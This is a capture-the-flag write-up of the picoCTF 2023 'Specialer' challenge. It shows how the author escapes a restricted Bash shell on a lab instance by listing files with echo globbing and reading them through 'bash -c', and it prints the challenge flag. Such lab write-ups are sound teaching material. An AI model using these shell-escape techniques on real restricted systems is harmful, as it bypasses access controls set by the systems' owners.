# Specialer

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Author: LT 'syreal' Jones, et al.

Description

Reception of Special has been cool to say the least. That's why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just 'Specialer'. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody's complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.

`ssh -p 63130 ctf-player@saturn.picoctf.net`. The password is `483e80d4`

## Find the flag

**In this challenge, we can SSH into the instance machine:**
```shell
┌[siunam♥earth]-(~/ctf/picoCTF-2023)-[2023.03.17|16:59:59(HKT)]
└> ssh -p 63130 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:63130 ([13.59.203.175]:63130)' can't be established.
ED25519 key fingerprint is SHA256:lMXKIC17ONzyUJx7ZYBY5VSwoxCz20uq5/Nm+IhXKew.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:63130' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Specialer$ 
```

```shell
Specialer$ whoami
-bash: whoami: command not found
Specialer$ id
-bash: id: command not found
Specialer$ pwd
/home/ctf-player
```

As you can see, looks like we're inside a **restricted Bash shell**, and we can only run some commands.

**According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#modify-path), we can use `echo` to list directories:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/picoCTF-2023/images/Pasted%20image%2020230317173400.png)

**Let's do that!**
```shell
Specialer$ echo *
abra ala sim
```

Oh! We found 3 directories: `abra`, `ala`, `sim`.

**`abra/`:**
```shell
Specialer$ echo abra/*
abra/cadabra.txt abra/cadaniel.txt
```

**`ala/`:**
```shell
Specialer$ echo ala/* 
ala/kazam.txt ala/mode.txt
```

**`sim/`:**
```shell
Specialer$ echo sim/*
sim/city.txt sim/salabim.txt
```

But how do we ***read*** those files??

**After fumbling around, I found that we can press the `Tab` key to list out all commands:**
```shell
Specialer$ 
!          break      coproc     esac       function   local      return     times      wait
./         builtin    declare    eval       getopts    logout     select     trap       while
:          caller     dirs       exec       hash       mapfile    set        true       {
[          case       disown     exit       help       popd       shift      type       }
[[         cd         do         export     history    printf     shopt      typeset    
]]         command    done       false      if         pushd      source     ulimit     
alias      compgen    echo       fc         in         pwd        suspend    umask      
bash       complete   elif       fg         jobs       read       test       unalias    
bg         compopt    else       fi         kill       readarray  then       unset      
bind       continue   enable     for        let        readonly   time       until
```

Hmm... The `bash` command looks sussy.

Then, according to [GTFOBins](https://gtfobins.github.io/gtfobins/bash/#file-read), **we can use `bash` to read files!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/picoCTF-2023/images/Pasted%20image%2020230317173651.png)

**Let's read those files!**
```shell
Specialer$ bash -c 'echo "$(<abra/cadabra.txt)"'
Nothing up my sleeve!
Specialer$ bash -c 'echo "$(<abra/cadaniel.txt)"'
Yes, I did it! I really did it! I'm a true wizard!
```

Nice! However, nothing interesting in `abra/`.

**How about `ala/`?**
```shell
Specialer$ bash -c 'echo "$(<ala/kazam.txt)"'
return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}
```

Bam! We found the flag!

- **Flag: `picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}`**

## Conclusion

What we've learned:

1. RBash Escape